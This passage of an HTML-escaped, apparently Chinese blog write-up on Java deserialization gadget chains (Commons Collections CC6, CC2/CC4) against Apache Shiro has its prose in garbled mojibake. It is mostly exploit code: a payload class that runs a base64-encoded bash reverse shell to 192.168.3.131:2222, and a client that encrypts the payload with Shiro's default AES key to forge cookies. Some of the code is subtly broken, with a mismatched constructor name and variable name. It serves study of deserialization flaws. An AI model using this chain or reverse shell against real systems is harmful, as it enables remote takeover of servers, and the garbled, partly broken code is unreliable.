&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">clear&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// åŒouterMap.clear()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¶æ„ç±»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Evil&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello TemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é€šè¿‡Client.javaè£…é…CC6Shiro&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroClient&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ysoserial&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payloads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">testCC6Shiro&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”±äºæˆ‘åœ¨Linuxä¸Šæµ‹è¯•ï¼Œå°±ä¸å¼¹è®¡ç®—å™¨ï¼Œç›´æ¥å¼¹shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302030308598.png" alt="image-20220302030308598">&lt;/p>
&lt;p>æ•ˆæœæ‹”ç¾¤ï¼ï¼ï¼ï¼ï¼ï¼&lt;/p>
&lt;p>è¿™ä¸€èŠ‚æˆ‘ä»¬å°†&lt;code>TemplatesImpl&lt;/code>å’ŒCC6ç»“åˆåœ¨ä¸€èµ·ï¼ŒåŒæ—¶è§£å†³äº†CC3é«˜ç‰ˆæœ¬åˆ©ç”¨ä¸äº†çš„é—®é¢˜&lt;/p>
&lt;h2 id="cc2---cc4">CC2 - cc4&lt;/h2>
&lt;p>CCååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼Œccä¾èµ–æœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒgroupIdå’ŒartifactIdéƒ½ä¸ä¸€æ ·&lt;/p>
&lt;ul>
&lt;li>commons-collections:commons-collections&lt;/li>
&lt;li>org.apache.commons:commons-collection4&lt;/li>
&lt;/ul>
&lt;p>è¡¨ç°åœ¨æˆ‘ä»¬æ„é€ expçš„åŒºåˆ«æ˜¯å°†&lt;code>decorate&lt;/code>æ”¹ä¸ºäº†&lt;code>LazyMap&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#00a8c8">super&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æ¥æŠŠgadgetæ”¹ä¸€ä¸‹åå­—å³å¯ï¼›ä¸è¿‡ä¸ºäº†ä¸“é—¨é€‚é…cc4ï¼Œysoserialä¹Ÿæœ‰ä¸“é—¨çš„é“¾å­CC2å’ŒCC4&lt;/p>
&lt;p>ccåŒ…ä¹‹æ‰€ä»¥èƒ½æ‰¾å‡ºè¿™ä¹ˆå¤šé“¾å­ï¼Œé™¤äº†ç›¸å½“åŸºç¡€ä»¥å¤–ï¼Œæ›´å¤šçš„åŸå› åœ¨äºå®ƒåŒ…å«äº†å¾ˆå¤šå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•çš„Transformerï¼Œæ‰€ä»¥æ‰¾é“¾å­çš„è¿‡ç¨‹ç›¸å½“äºæ‰¾ä¸€æ¡ä»&lt;code>Serializable#readObject&lt;/code>åˆ°&lt;code>Transformer#transform&lt;/code>æ–¹æ³•çš„è°ƒç”¨é“¾&lt;/p>
&lt;p>æˆ‘ä»¬åˆ†æä¸€ä¸‹CC2ï¼Œå®ƒç”¨åˆ°çš„å…³é”®ç±»æœ‰&lt;code>java.util.PriorityQueue&lt;/code>å’Œ&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>ï¼ˆå¯é€šè¿‡comprareè°ƒç”¨transformï¼‰&lt;/p>
&lt;p>&lt;code>java.util.PriorityQueue&lt;/code>é‡å†™äº†&lt;code>readObject&lt;/code>æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in size, and any hidden stuff
